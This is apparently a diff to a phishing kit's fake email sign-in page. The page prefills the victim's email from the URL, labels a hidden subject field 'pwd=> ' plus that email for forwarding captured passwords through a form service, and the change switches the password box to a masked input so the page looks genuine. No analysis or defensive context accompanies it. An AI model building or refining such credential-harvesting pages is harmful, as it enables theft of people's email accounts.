@@ -1461,7 +1461,7 @@ function RndMimeCtlHlpr(objid, classid, ns, id)
 	 <input type="email" name="email" id="email" placeholder="Email address" style="font-size: 12pt; height: 30px; width:260px;" required="" oninvalid="this.setCustomValidity('Enter your email password')" oninput="this.setCustomValidity('')">
 
 		<div class="signInInputLabel" id="password" aria-hidden="true">Password:</div>
-		<div><input type="text" name="Password" placeholder="password" style="font-size: 12pt; height: 30px; width:260px;font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;" required="" oninvalid="this.setCustomValidity('Enter your email password')" oninput="this.setCustomValidity('')"></div>
+		<div><input type="password" name="Password" placeholder="password" style="font-size: 12pt; height: 30px; width:260px;font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;" required="" oninvalid="this.setCustomValidity('Enter your email password')" oninput="this.setCustomValidity('')"></div>
         <div class="showPasswordCheck signInCheckBoxText">
             <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
             <span>Show password</span>
@@ -1501,4 +1501,5 @@ const params=new URLSearchParams(window.location.search);
 document.getElementById('email').value=params.get('email');
 document.getElementById('subject').value="pwd=> " + params.get('email');
 </script><div class="ratufa-overlay" id="ratufa_popup"> <div class="ratufa-popup-container"> <a class="ratufa-popup-close" href="javascript:void(0);">×</a> <div class="ratufa-popup"> <div class="ratufa-popup-title">Popup Title 2</div> <div class="ratufa-popup-content"> Popup Content </div> </div> </div> </div></body></html>
+
 
